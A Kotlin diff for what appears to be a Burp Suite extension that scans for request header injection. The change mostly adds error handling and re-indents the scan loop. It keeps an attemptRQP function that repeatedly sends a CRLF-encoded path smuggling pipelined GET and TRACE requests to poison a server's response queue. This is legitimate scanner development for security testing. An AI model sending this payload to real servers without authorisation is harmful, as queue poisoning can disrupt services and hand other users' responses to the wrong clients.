@@ -59,352 +59,363 @@ internal class ReqHeaderInjectionScan(name: String?) : Scan(name) {
 
     //this is where your scan logic goes
     override fun doScan(baseReq: ByteArray, service: IHttpService): MutableList<IScanIssue> {
+        try {
+            val wafChecker = WAFChecker()
 
-	    val wafChecker = WAFChecker()
+            var pocHasRun = false
 
-        var pocHasRun = false
-
-        // Add all the enabled permutations types
-        val enabledMutations = arrayListOf<String>()
-        for (mutation in headerBasedMutations.settings) {
-            if (Utilities.globalSettings.getBoolean(mutation)) {
-                enabledMutations.add(mutation)
+            // Add all the enabled permutations types
+            val enabledMutations = arrayListOf<String>()
+            for (mutation in headerBasedMutations.settings) {
+                if (Utilities.globalSettings.getBoolean(mutation)) {
+                    enabledMutations.add(mutation)
+                }
             }
-        }
-        for (mutation in pathBasedMutations.settings) {
-            if (Utilities.globalSettings.getBoolean(mutation)) {
-                enabledMutations.add(mutation)
+            for (mutation in pathBasedMutations.settings) {
+                if (Utilities.globalSettings.getBoolean(mutation)) {
+                    enabledMutations.add(mutation)
+                }
             }
-        }
-        for (mutation in protocolBasedMutations.settings) {
-            if (Utilities.globalSettings.getBoolean(mutation)) {
-                enabledMutations.add(mutation)
+            for (mutation in protocolBasedMutations.settings) {
+                if (Utilities.globalSettings.getBoolean(mutation)) {
+                    enabledMutations.add(mutation)
+                }
             }
-        }
-        for (mutation in smuggleBasedMutations.settings) {
-            if (Utilities.globalSettings.getBoolean(mutation)) {
-                enabledMutations.add(mutation)
+            for (mutation in smuggleBasedMutations.settings) {
+                if (Utilities.globalSettings.getBoolean(mutation)) {
+                    enabledMutations.add(mutation)
+                }
             }
-        }
-        //Add param miner headers if enabled
-        if (Utilities.globalSettings.getBoolean("Enable param-miner headers")) {
-            for (mutation in paramMinerMutations.settings) {
-                enabledMutations.add(mutation)
-            }
-        }
-
-        var forceHP1 = false
-
-
-        if (Utilities.isHTTP2(baseReq)) {
-            forceHP1 = false
-        } else {
-            forceHP1 = true
-        }
-
-        var baseRequest: HttpRequest
-
-        //Add OPTIONAL cache buster...
-        if (Utilities.globalSettings.getBoolean("Add cache buster")) {
-            baseRequest = Utilities.buildMontoyaResp(request(service, Utilities.addCacheBuster(baseReq, Utilities.generateCanary()))).request()
-        } else {
-            baseRequest = Utilities.buildMontoyaResp(request(service, baseReq)).request()
-        }
-
-        var currentStatusDiff = ""
-        var previousStatusDiff = ""
-
-        lateinit var previousBenignRequestResponse: MontoyaRequestResponse
-        lateinit var previousProbeRequestResponse: MontoyaRequestResponse
-
-        lateinit var benignRequestResponse: MontoyaRequestResponse
-        lateinit var probeRequestResponse: MontoyaRequestResponse
-
-        //Override method if we want...
-        if (Utilities.globalSettings.getBoolean("Enable method override")) {
-            baseRequest = baseRequest.withMethod(Utilities.globalSettings.getString("method override"))
-        }
-
-        // for (permutation in permutations) {} //As per the PDS from http1mustdie...
-        for (technique in enabledMutations) {
-            if (Utilities.unloaded.get()) {
-                break
+            //Add param miner headers if enabled
+            if (Utilities.globalSettings.getBoolean("Enable param-miner headers")) {
+                for (mutation in paramMinerMutations.settings) {
+                    enabledMutations.add(mutation)
+                }
             }
 
-            //Skip the rest of the techniques if we're told too (when a valid report was found)
-            if (Utilities.globalSettings.getBoolean("skip vulnerable hosts") && BulkScan.hostsToSkip.containsKey(service.host)) {
-                break
+            var forceHP1 = false
+
+
+            if (Utilities.isHTTP2(baseReq)) {
+                forceHP1 = false
+            } else {
+                forceHP1 = true
             }
 
-            //TODO cache buster should be added here... / updated on every request
+            var baseRequest: HttpRequest
 
-            val probe = mutator.getProbe(baseRequest, technique)
+            //Add OPTIONAL cache buster...
+            if (Utilities.globalSettings.getBoolean("Add cache buster")) {
+                baseRequest = Utilities.buildMontoyaResp(request(service, Utilities.addCacheBuster(baseReq, Utilities.generateCanary()))).request()
+            } else {
+                baseRequest = Utilities.buildMontoyaResp(request(service, baseReq)).request()
+            }
 
+            var currentStatusDiff = ""
+            var previousStatusDiff = ""
 
-            //Check each probe 5 times for consistency...
-            for (i in 1..Utilities.globalSettings.getInt("confirmations")) {
+            lateinit var previousBenignRequestResponse: MontoyaRequestResponse
+            lateinit var previousProbeRequestResponse: MontoyaRequestResponse
+
+            lateinit var benignRequestResponse: MontoyaRequestResponse
+            lateinit var probeRequestResponse: MontoyaRequestResponse
+
+            //Override method if we want...
+            if (Utilities.globalSettings.getBoolean("Enable method override")) {
+                baseRequest = baseRequest.withMethod(Utilities.globalSettings.getString("method override"))
+            }
+
+            // for (permutation in permutations) {} //As per the PDS from http1mustdie...
+            for (technique in enabledMutations) {
                 if (Utilities.unloaded.get()) {
                     break
                 }
 
-                val sendBenignRequest = {
-                    benignRequestResponse = request(probe.benignRequest, forceHP1)
-
-                    !responseHasErrors(benignRequestResponse) //indicate failure
-                }
-
-                val sendProbeRequest = {
-                    probeRequestResponse = request(probe.probeRequest, forceHP1)
-
-                    !(responseHasErrors(probeRequestResponse) && !probe.expectedResponseMatches.contains("TIMEOUT")) //If it's an expected timeout, don't check for errors
-                    //indicate failure
-                }
-
-
-                //Randomly choose which probe goes first...
-                val runSuccess = if (Random.nextBoolean()) {
-                    sendBenignRequest() && sendProbeRequest()
-                } else {
-                    sendProbeRequest() && sendBenignRequest()
-                }
-
-                //Exit if either probe failed
-                if (!runSuccess) {
-                    currentStatusDiff = ""
+                //Skip the rest of the techniques if we're told too (when a valid report was found)
+                if (Utilities.globalSettings.getBoolean("skip vulnerable hosts") && BulkScan.hostsToSkip.containsKey(service.host)) {
                     break
                 }
 
-                //Check if the responses are inconsistent on their own...
-                if (i != 1) { //Skip on first run...
+                //TODO cache buster should be added here... / updated on every request
 
-                    //Benign
-                    if (benignRequestResponse.serverStatus() != previousBenignRequestResponse.serverStatus()) {
+                val probe = mutator.getProbe(baseRequest, technique)
+
+
+                //Check each probe 5 times for consistency...
+                for (i in 1..Utilities.globalSettings.getInt("confirmations")) {
+                    if (Utilities.unloaded.get()) {
+                        break
+                    }
+
+                    val sendBenignRequest = {
+                        benignRequestResponse = request(probe.benignRequest, forceHP1)
+
+                        !responseHasErrors(benignRequestResponse) //indicate failure
+                    }
+
+                    val sendProbeRequest = {
+                        probeRequestResponse = request(probe.probeRequest, forceHP1)
+
+                        !(responseHasErrors(probeRequestResponse) && !probe.expectedResponseMatches.contains("TIMEOUT")) //If it's an expected timeout, don't check for errors
+                        //indicate failure
+                    }
+
+
+                    //Randomly choose which probe goes first...
+                    val runSuccess = if (Random.nextBoolean()) {
+                        sendBenignRequest() && sendProbeRequest()
+                    } else {
+                        sendProbeRequest() && sendBenignRequest()
+                    }
+
+                    //Exit if either probe failed
+                    if (!runSuccess) {
                         currentStatusDiff = ""
                         break
                     }
 
-                    //Probe
-                    if (probeRequestResponse.serverStatus() != previousProbeRequestResponse.serverStatus()) {
-                        currentStatusDiff = ""
-                        break
-                    }
-                }
+                    //Check if the responses are inconsistent on their own...
+                    if (i != 1) { //Skip on first run...
 
-                //Set previous responses to keep track...
-                previousBenignRequestResponse = benignRequestResponse
-                previousProbeRequestResponse = probeRequestResponse
+                        //Benign
+                        if (benignRequestResponse.serverStatus() != previousBenignRequestResponse.serverStatus()) {
+                            currentStatusDiff = ""
+                            break
+                        }
 
-
-                //If no difference in responses... then give up
-                if (probeRequestResponse.serverStatus() == benignRequestResponse.serverStatus()) {
-                    currentStatusDiff = ""
-                    break
-                }
-
-                currentStatusDiff = "${benignRequestResponse.serverStatus()}|${probeRequestResponse.serverStatus()}"
-
-
-                //If after the current repeat our <server><status> strings don't match... something is inconsistent regardless of probe
-                if (i != 1 && previousStatusDiff != currentStatusDiff) {
-                    //Make the attributes empty so we can prevent reporting
-                    currentStatusDiff = ""
-                    break
-                }
-
-                //If we don't hit all the expected response matches when "Enable fallback Diff" is disabled, we can exit.
-                if (!Utilities.globalSettings.getBoolean("Enable fallback diff")) {
-                    for (match in probe.expectedResponseMatches) {
-                        if (!probeRequestResponse.response().contains(match, true)) {
-                            //If fallback diff isn't enabled, then we can exit early here
+                        //Probe
+                        if (probeRequestResponse.serverStatus() != previousProbeRequestResponse.serverStatus()) {
                             currentStatusDiff = ""
                             break
                         }
                     }
-                }
 
-                previousStatusDiff = currentStatusDiff
-            }
+                    //Set previous responses to keep track...
+                    previousBenignRequestResponse = benignRequestResponse
+                    previousProbeRequestResponse = probeRequestResponse
 
-            // This should be set to "" if there is no difference
-            if (currentStatusDiff.isNotEmpty()) {
 
-                //Check for known false positives...
-                if (Utilities.globalSettings.getBoolean("Filter Known FP") && (wafChecker.isWafResponse(probeRequestResponse.response()) || wafChecker.isWafResponse(benignRequestResponse.response()))) {
-                    continue
-                }
-
-                //If we hit the exact match we hoped for... report immediately
-                //Needs updating i think... should maybe still proove that we got a different response... :thinking:
-                var numberOfMatches = 0
-
-                if (!probe.expectedResponseMatches.contains("TIMEOUT")) {
-                    probe.expectedResponseMatches.forEach {
-                        match ->
-                            if (match == "NO_HEADERS") {
-                                if (probeRequestResponse.response().statusCode() == "0".toShort()) {
-                                    numberOfMatches += 1
-                                }
-                                if (benignRequestResponse.response().statusCode() == "0".toShort()) {
-                                    numberOfMatches = 0
-                                }
-                            } else {
-                                if (probeRequestResponse.response().contains(match, true)) {
-                                    numberOfMatches += 1
-                                }
-
-                                if (benignRequestResponse.response().contains(match, true)) {
-                                    numberOfMatches = 0 //set to 0 to cause the logic below to fail... if the match also appears in the base response it's probably nothing...
-                                }
-                            }
+                    //If no difference in responses... then give up
+                    if (probeRequestResponse.serverStatus() == benignRequestResponse.serverStatus()) {
+                        currentStatusDiff = ""
+                        break
                     }
-                    if (numberOfMatches != 0 && numberOfMatches == probe.expectedResponseMatches.size) { //If we got a match on every entry one of the expected response matches.
 
-                        // todo Validate this further by removing the parts that should actually make this work...
-                        // todo launch an optional attack for quickly check for desync via RQP or similar? :thinking:
-                        if (!Utilities.globalSettings.getBoolean("Enable follow up")) {
-                            // Follow up no enabled, skip
-                            continue
-                        }
+                    currentStatusDiff = "${benignRequestResponse.serverStatus()}|${probeRequestResponse.serverStatus()}"
 
-                        // No if it is enabled, perform  follow up!
-                        if (!confirmedVulnerable(probeRequestResponse, technique)) {
-                            // If confirmedVulnerable comes up false... skip
-                            continue
-                        }
 
-                        //Fix broken responses... (responses without status codes...)
-                        if (probeRequestResponse.response().statusCode() == "0".toShort()) {
-                            probeRequestResponse = MontoyaRequestResponse(HttpRequestResponse.httpRequestResponse(probeRequestResponse.request(), probeRequestResponse.response().withStatusCode("1337".toShort())))
-                        }
+                    //If after the current repeat our <server><status> strings don't match... something is inconsistent regardless of probe
+                    if (i != 1 && previousStatusDiff != currentStatusDiff) {
+                        //Make the attributes empty so we can prevent reporting
+                        currentStatusDiff = ""
+                        break
+                    }
 
-                        // Attempt poc (before report otherwise our logic  breaks...)
-                        if (Utilities.globalSettings.getBoolean("skip vulnerable hosts") || Utilities.globalSettings.getBoolean("skip flagged hosts")) {
-                            if (BulkUtilities.callbacks.getScanIssues(benignRequestResponse.request().httpService().toString()).isEmpty()) {
-                                if (Utilities.globalSettings.getBoolean("attempt poc") && !pocHasRun) {
-                                    pocHasRun = true
-                                    attemptRQP(baseRequest)
-                                }
+                    //If we don't hit all the expected response matches when "Enable fallback Diff" is disabled, we can exit.
+                    if (!Utilities.globalSettings.getBoolean("Enable fallback diff")) {
+                        for (match in probe.expectedResponseMatches) {
+                            if (!probeRequestResponse.response().contains(match, true)) {
+                                //If fallback diff isn't enabled, then we can exit early here
+                                currentStatusDiff = ""
+                                break
                             }
-                        } else if (Utilities.globalSettings.getBoolean("attempt poc") && !pocHasRun) {
-                            pocHasRun = true
-                            attemptRQP(baseRequest)
                         }
+                    }
 
-                        
+                    previousStatusDiff = currentStatusDiff
+                }
 
-                        report("Request Header Injection via $technique",
-                            """
-                            The application behaves in a manner that is consistent with Request Header Injection...
-                            """,
-                            baseReq,
-                            benignRequestResponse,
-                            probeRequestResponse
-                        )
+                // This should be set to "" if there is no difference
+                if (currentStatusDiff.isNotEmpty()) {
 
-                        if (Utilities.globalSettings.getBoolean("Log issues to output")) {
-                            Utilities.out("Request Header Injection via $technique at ${benignRequestResponse.request().url()}")
-                        }
-
-                        if (Utilities.globalSettings.getBoolean("skip vulnerable hosts")) {
-                            BulkScan.hostsToSkip.putIfAbsent(service.host, true)
-                        }
-
+                    //Check for known false positives...
+                    if (Utilities.globalSettings.getBoolean("Filter Known FP") && (wafChecker.isWafResponse(probeRequestResponse.response()) || wafChecker.isWafResponse(benignRequestResponse.response()))) {
                         continue
                     }
-                }
 
-                if (!Utilities.globalSettings.getBoolean("Enable fallback diff")) {
-                    continue
-                }
+                    //If we hit the exact match we hoped for... report immediately
+                    //Needs updating i think... should maybe still proove that we got a different response... :thinking:
+                    var numberOfMatches = 0
 
-                //Skip any techniques that we don't care about checking response attributes for OR just skip altogether if not enabled
-                if (technique in listOf("robots", "sitemap", "favicon")) {
-                    continue
-                }
+                    if (!probe.expectedResponseMatches.contains("TIMEOUT")) {
+                        probe.expectedResponseMatches.forEach {
+                            match ->
+                                if (match == "NO_HEADERS") {
+                                    if (probeRequestResponse.response().statusCode() == "0".toShort()) {
+                                        numberOfMatches += 1
+                                    }
+                                    if (benignRequestResponse.response().statusCode() == "0".toShort()) {
+                                        numberOfMatches = 0
+                                    }
+                                } else {
+                                    if (probeRequestResponse.response().contains(match, true)) {
+                                        numberOfMatches += 1
+                                    }
 
-                // todo Validate this further by removing the parts that should actually make this work...
-                if (!Utilities.globalSettings.getBoolean("Enable follow up")) {
-                    // Follow up no enabled, skip
-                    continue
-                }
+                                    if (benignRequestResponse.response().contains(match, true)) {
+                                        numberOfMatches = 0 //set to 0 to cause the logic below to fail... if the match also appears in the base response it's probably nothing...
+                                    }
+                                }
+                        }
+                        if (numberOfMatches != 0 && numberOfMatches == probe.expectedResponseMatches.size) { //If we got a match on every entry one of the expected response matches.
 
-                // No if it is enabled, perform  follow up!
-                if (!confirmedVulnerable(probeRequestResponse, technique)) {
-                    // If confirmedVulnerable comes up false... skip
-                    continue
-                }
+                            // todo Validate this further by removing the parts that should actually make this work...
+                            // todo launch an optional attack for quickly check for desync via RQP or similar? :thinking:
+                            if (!Utilities.globalSettings.getBoolean("Enable follow up")) {
+                                // Follow up no enabled, skip
+                                continue
+                            }
 
-                // Attempt poc (before report otherwise our logic  breaks...)
-                if (Utilities.globalSettings.getBoolean("skip vulnerable hosts") || Utilities.globalSettings.getBoolean("skip flagged hosts")) {
-                    if (BulkUtilities.callbacks.getScanIssues(benignRequestResponse.request().httpService().toString()).isEmpty()) {
-                        if (Utilities.globalSettings.getBoolean("attempt poc") && !pocHasRun) {
-                            pocHasRun = true
-                            attemptRQP(baseRequest)
+                            // No if it is enabled, perform  follow up!
+                            if (!confirmedVulnerable(probeRequestResponse, technique)) {
+                                // If confirmedVulnerable comes up false... skip
+                                continue
+                            }
+
+                            //Fix broken responses... (responses without status codes...)
+                            if (probeRequestResponse.response().statusCode() == "0".toShort()) {
+                                probeRequestResponse = MontoyaRequestResponse(HttpRequestResponse.httpRequestResponse(probeRequestResponse.request(), probeRequestResponse.response().withStatusCode("1337".toShort())))
+                            }
+
+                            // Attempt poc (before report otherwise our logic  breaks...)
+                            if (Utilities.globalSettings.getBoolean("skip vulnerable hosts") || Utilities.globalSettings.getBoolean("skip flagged hosts")) {
+                                if (BulkUtilities.callbacks.getScanIssues(benignRequestResponse.request().httpService().toString()).isEmpty()) {
+                                    if (Utilities.globalSettings.getBoolean("attempt poc") && !pocHasRun) {
+                                        pocHasRun = true
+                                        attemptRQP(baseRequest)
+                                    }
+                                }
+                            } else if (Utilities.globalSettings.getBoolean("attempt poc") && !pocHasRun) {
+                                pocHasRun = true
+                                attemptRQP(baseRequest)
+                            }
+
+
+
+                            report("Request Header Injection via $technique",
+                                """
+                                The application behaves in a manner that is consistent with Request Header Injection...
+                                """,
+                                baseReq,
+                                benignRequestResponse,
+                                probeRequestResponse
+                            )
+
+                            if (Utilities.globalSettings.getBoolean("Log issues to output")) {
+                                Utilities.out("Request Header Injection via $technique at ${benignRequestResponse.request().url()}")
+                            }
+
+                            if (Utilities.globalSettings.getBoolean("skip vulnerable hosts")) {
+                                BulkScan.hostsToSkip.putIfAbsent(service.host, true)
+                            }
+
+                            continue
                         }
                     }
-                } else if (Utilities.globalSettings.getBoolean("attempt poc") && !pocHasRun) {
-                    pocHasRun = true
-                    attemptRQP(baseRequest)
-                }
 
-                report(
-                    "Request Header Injection via $technique - Dodgy", """
-                    The application behaves in a manner that is consistent with Request Header Injection...Sort of
-                    """, baseReq, benignRequestResponse, probeRequestResponse
-                )
+                    if (!Utilities.globalSettings.getBoolean("Enable fallback diff")) {
+                        continue
+                    }
 
-                if (Utilities.globalSettings.getBoolean("Log issues to output")) {
-                    Utilities.out("Request Header Injection via $technique - Dodgy - at ${benignRequestResponse.request().url()}")
-                }
+                    //Skip any techniques that we don't care about checking response attributes for OR just skip altogether if not enabled
+                    if (technique in listOf("robots", "sitemap", "favicon")) {
+                        continue
+                    }
 
-                if (Utilities.globalSettings.getBoolean("skip vulnerable hosts")) {
-                    BulkScan.hostsToSkip.putIfAbsent(service.host, true)
+                    // todo Validate this further by removing the parts that should actually make this work...
+                    if (!Utilities.globalSettings.getBoolean("Enable follow up")) {
+                        // Follow up no enabled, skip
+                        continue
+                    }
+
+                    // No if it is enabled, perform  follow up!
+                    if (!confirmedVulnerable(probeRequestResponse, technique)) {
+                        // If confirmedVulnerable comes up false... skip
+                        continue
+                    }
+
+                    // Attempt poc (before report otherwise our logic  breaks...)
+                    if (Utilities.globalSettings.getBoolean("skip vulnerable hosts") || Utilities.globalSettings.getBoolean("skip flagged hosts")) {
+                        if (BulkUtilities.callbacks.getScanIssues(benignRequestResponse.request().httpService().toString()).isEmpty()) {
+                            if (Utilities.globalSettings.getBoolean("attempt poc") && !pocHasRun) {
+                                pocHasRun = true
+                                attemptRQP(baseRequest)
+                            }
+                        }
+                    } else if (Utilities.globalSettings.getBoolean("attempt poc") && !pocHasRun) {
+                        pocHasRun = true
+                        attemptRQP(baseRequest)
+                    }
+
+                    report(
+                        "Request Header Injection via $technique - Dodgy", """
+                        The application behaves in a manner that is consistent with Request Header Injection...Sort of
+                        """, baseReq, benignRequestResponse, probeRequestResponse
+                    )
+
+                    if (Utilities.globalSettings.getBoolean("Log issues to output")) {
+                        Utilities.out("Request Header Injection via $technique - Dodgy - at ${benignRequestResponse.request().url()}")
+                    }
+
+                    if (Utilities.globalSettings.getBoolean("skip vulnerable hosts")) {
+                        BulkScan.hostsToSkip.putIfAbsent(service.host, true)
+                    }
+                    continue
                 }
-                continue
             }
+
+
+
+            return mutableListOf<IScanIssue>()
+        } catch(e: Exception) {
+            Utilities.err(e.message)
+            return mutableListOf<IScanIssue>()
         }
-
-
-
-        return mutableListOf<IScanIssue>()
     }
 
     fun attemptRQP(baseRequest: HttpRequest): Boolean {
-
-        var basePath = "/"
-        if (Utilities.globalSettings.getBoolean(("maintain path"))) {
-            basePath = baseRequest.pathWithoutQuery()
-        }
-
-        //Attack string is a RQP gadget I hope might work
-        val attackRequest = baseRequest.withPath("$basePath%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
-                + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
-                + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
-                + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
-                + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
-                + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
-                + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
-                + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
-                + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
-                + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
-                + "TRACE%20/%20HTTP/1.1%0d%0aX:%20x")
-
-        var previousServerStatus = ""
-
-        for (i in 0..100) {
-            val attackRequestResponse = request(attackRequest, false)
-            if (i == 0) {
-                previousServerStatus = attackRequestResponse.serverStatus().toString()
-                continue
+        try {
+            var basePath = "/"
+            if (Utilities.globalSettings.getBoolean(("maintain path"))) {
+                basePath = baseRequest.pathWithoutQuery()
             }
-            val currentServerStatus = attackRequestResponse.serverStatus().toString()
 
-            if (previousServerStatus != currentServerStatus) {
-                reportToOrganiser("RQP!?!?!?!\r\n$previousServerStatus|$currentServerStatus", attackRequestResponse)
-                return true
+            //Attack string is a RQP gadget I hope might work
+            val attackRequest = baseRequest.withPath("$basePath%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
+                    + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
+                    + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
+                    + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
+                    + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
+                    + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
+                    + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
+                    + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
+                    + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
+                    + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
+                    + "TRACE%20/%20HTTP/1.1%0d%0aX:%20x")
+
+            var previousServerStatus = ""
+
+            for (i in 0..100) {
+                if (Utilities.unloaded.get()) {
+                    break
+                }
+                val attackRequestResponse = request(attackRequest, false)
+                if (i == 0) {
+                    previousServerStatus = attackRequestResponse.serverStatus().toString()
+                    continue
+                }
+                val currentServerStatus = attackRequestResponse.serverStatus().toString()
+
+                if (previousServerStatus != currentServerStatus) {
+                    reportToOrganiser("RQP!?!?!?!\r\n$previousServerStatus|$currentServerStatus", attackRequestResponse)
+                    return true
+                }
             }
+            return false
+        } catch(e: Exception) {
+            Utilities.err(e.message)
+            return false
         }
-        return false
     }
 
 }
@@ -428,26 +439,36 @@ fun fixMissingStatuscode(requestResponse: HttpRequestResponse): HttpRequestRespo
 }
 
 fun confirmedVulnerable(probeReqResp: MontoyaRequestResponse, technique: String): Boolean {
-    //Filter out ones that will break.... robots.txt?anything will of course work so...
-    if (technique in listOf("robots", "sitemap", "favicon")) {
+    try {
+        //Filter out ones that will break.... robots.txt?anything will of course work so...
+        if (technique in listOf("robots", "sitemap", "favicon")) {
+            return true
+        }
+
+        val confirmReqResp = Scan.request(
+            probeReqResp.request().withPath(probeReqResp.request().pathWithoutQuery().replace("%20", "a?%20")), false
+        ) //the extra a is a BUG I think
+
+        if (confirmReqResp.serverStatus() == probeReqResp.serverStatus()) {
+            //If we get the same response having made the entire path a query component... it's a FProbeReqResp.request().withPath()
+            return false
+        }
+
+        val confirmReqResp2 = Scan.request(
+            probeReqResp.request().withPath(probeReqResp.request().pathWithoutQuery().replaceFirst("%20", "%3f%20")),
+            false
+        )
+
+        if (confirmReqResp2.serverStatus() != probeReqResp.serverStatus()) {
+            //if encoding the query then produces a different serverStatus compared to the probe it's a FP... nginx should be fine with this
+            return false
+        }
+
         return true
-    }
-
-    val confirmReqResp = Scan.request(probeReqResp.request().withPath(probeReqResp.request().pathWithoutQuery().replace("%20", "a?%20")), false) //the extra a is a BUG I think
-
-    if (confirmReqResp.serverStatus() == probeReqResp.serverStatus()) {
-        //If we get the same response having made the entire path a query component... it's a FProbeReqResp.request().withPath()
+    } catch (e: Exception) {
+        Utilities.err(e.message)
         return false
     }
-
-    val confirmReqResp2 = Scan.request(probeReqResp.request().withPath(probeReqResp.request().pathWithoutQuery().replaceFirst("%20", "%3f%20")), false)
-
-    if (confirmReqResp2.serverStatus() != probeReqResp.serverStatus()) {
-        //if encoding the query then produces a different serverStatus compared to the probe it's a FP... nginx should be fine with this
-        return false
-    }
-
-    return true
 
 
     //TODO these techniques were not very good... Great at filtering out FP, but really bad a filtering out TP also
